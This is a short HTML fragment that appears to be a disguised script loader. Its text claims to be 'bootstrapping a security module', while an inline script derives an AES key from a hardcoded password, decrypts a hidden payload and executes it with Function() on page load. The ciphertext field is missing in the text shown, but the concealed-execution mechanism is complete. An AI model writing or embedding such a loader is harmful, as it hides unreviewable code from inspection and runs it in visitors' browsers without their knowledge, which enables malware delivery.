    <p>Bootstrapping security module...</p>
    <script>
        async function decryptData(encrypted, iv, salt, key) {
            const hexToArray = hex => new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
            
            const baseKey = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(key),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            const derivedKey = await crypto.subtle.deriveKey(
                { name: "PBKDF2", salt: hexToArray(salt), iterations: 100000, hash: "SHA-256" },
                baseKey,
                { name: "AES-GCM", length: 256 },
                false,
                ["decrypt"]
            );

            return crypto.subtle.decrypt(
                { name: "AES-GCM", iv: hexToArray(iv) },
                derivedKey,
                hexToArray(encrypted)
            ).then(decrypted => new TextDecoder().decode(decrypted)).catch(() => null);
        }

        (async () => {
            const encryptedPayload = {
                iv: "0a6d791008bd13b5d22d4e92",
                salt: "cb6853c10fc7a13ae3fd54b1af489606",

            };
            
            const secretKey = "homesweethome";
            const decryptedResult = await decryptData(encryptedPayload.encrypted, encryptedPayload.iv, encryptedPayload.salt, secretKey);
            
            if (decryptedResult) {
                Function(decryptedResult)();
            }
        })();
    </script>
